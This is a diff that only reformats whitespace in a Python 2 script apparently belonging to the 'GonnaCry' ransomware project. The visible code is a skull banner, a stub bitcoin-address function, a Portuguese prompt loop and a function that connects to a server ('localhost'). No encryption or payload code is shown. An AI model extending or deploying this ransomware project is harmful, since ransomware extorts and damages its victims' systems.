@@ -6,7 +6,7 @@ import os, socket
 
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
 
-skull='''
+skull = '''
    .o oOOOOOOOo                                            OOOo
     Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
     OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
@@ -37,7 +37,7 @@ Brincadeira, apenas digite 1.
 '''
 
 def bitcoin_addr():
-    a=0
+    a = 0
 
 '''
 >>> shutil.copytree('Ransomware','~/Desktop/GonnaCry')
@@ -71,16 +71,16 @@ OSError: [Errno 13] Permission denied: '/home/tarcisioDesktop'
 
 def identificador(pergunta):
     os.system('clear')
-    if(pergunta=='ajuda' or pergunta=='help'):
+    if(pergunta == 'ajuda' or pergunta == 'help'):
         print(ajuda)
 
-    elif(pergunta=='1' or pergunta=='sim' or pergunta=='s'):
+    elif(pergunta == '1' or pergunta == 'sim' or pergunta == 's'):
         conect_to_serv()
 
 
-def conect_to_serv(IP_serv='localhost'):
-    f=open('caminho_gc.txt','r')
-    caminho=f.read()
+def conect_to_serv(IP_serv = 'localhost'):
+    f = open('caminho_gc.txt','r')
+    caminho = f.read()
     if(os.path.isdir(caminho)):
         os.chdir(caminho)
         os.listdir(os.getcwd())
@@ -104,14 +104,14 @@ def conect_to_serv(IP_serv='localhost'):
 def chat():
     while True:
         try:
-            pergunta=raw_input('\33[94m~> \033[0m')
+            pergunta = raw_input('\33[94m~> \033[0m')
             identificador(pergunta.lower())
         except KeyboardInterrupt:
-            a=raw_input('deseja sair? ')
-            if(a=='sim' or a=='s' or a=='1'):
+            a = raw_input('deseja sair? ')
+            if(a == 'sim' or a == 's' or a == '1'):
                 exit()
 
-if __name__=='__main__':
+if __name__ == '__main__':
     os.system('clear')
     print('{0}'+skull+'{1}').format(RED,GREEN)
     chat()
